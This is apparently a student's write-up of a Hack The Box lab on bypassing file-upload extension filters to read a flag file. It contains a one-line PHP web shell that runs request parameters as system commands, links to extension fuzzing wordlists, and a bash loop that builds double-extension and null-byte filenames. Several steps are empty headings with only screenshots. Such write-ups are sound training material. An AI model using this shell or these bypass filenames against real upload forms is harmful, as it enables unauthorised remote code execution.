# Whitelist Filters

The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions.
Try to bypass both to upload a PHP script and execute code to read "/flag.txt"

`Hint`: You may use either of the last two techniques. If one extension is blocked, try another one that can execute PHP code.

Test payload:
```php
<?php echo "Hello HTB"; ?>
```
- PHP shell:
  ```php
  <?php system($_REQUEST['cmd']); ?>
  ```
- Fuzzing extension whitelist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
(It could be useful to add common image extensions).
- Fuzzing extension list: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

We attempted to subbmit a simple php script with a test payload:

![image](https://github.com/user-attachments/assets/f7bb5a8e-dba6-40ea-a7fb-c57bbb2b6794)

We notice we have differente message responses depending either the response is from the whitelist or blacklist.

We attempted to subbmit a php script using `Double Extensions`:

We attempted to subbmit a php script using a `Reverse Double Extension`:

We also attempted:

We tried to submit a php script with null bytes:

We perform a common extension fuzzing with `Burp Suite Intruder` in order to know the extensions whitelisted:
![image](https://github.com/user-attachments/assets/05fb203f-bed3-498d-a3b9-4ae4ef6b6489)
all of this extensios are not allowed.
![image](https://github.com/user-attachments/assets/933acd67-c3b5-4b8d-9f50-77387ddfb498)
We realized that we receive the response `Only images are allowed` when the server response using the whitelist and `Extension not allowed` if the server is using the blacklist.


We performed a extension fuzzing using `Burp Suite Intruder`:

Also we can create a custom wordlist with the following script:
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':' ';'; do
    for ext in '.php' '.phps' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.png" >> wordlist.txt
        echo "shell$ext$char.png" >> wordlist.txt
        echo "shell.png$char$ext" >> wordlist.txt
        echo "shell.png$ext$char" >> wordlist.txt
    done
done
```
Then we perform a fuzzing using this list created:

We tried to get de file submitted by using `Intruder`:

Using repetear we submitted a simple php web shell:

![image](https://github.com/user-attachments/assets/412f206a-e218-47c5-9b56-e536aeb732ee)

We get the flag and solve the lab:
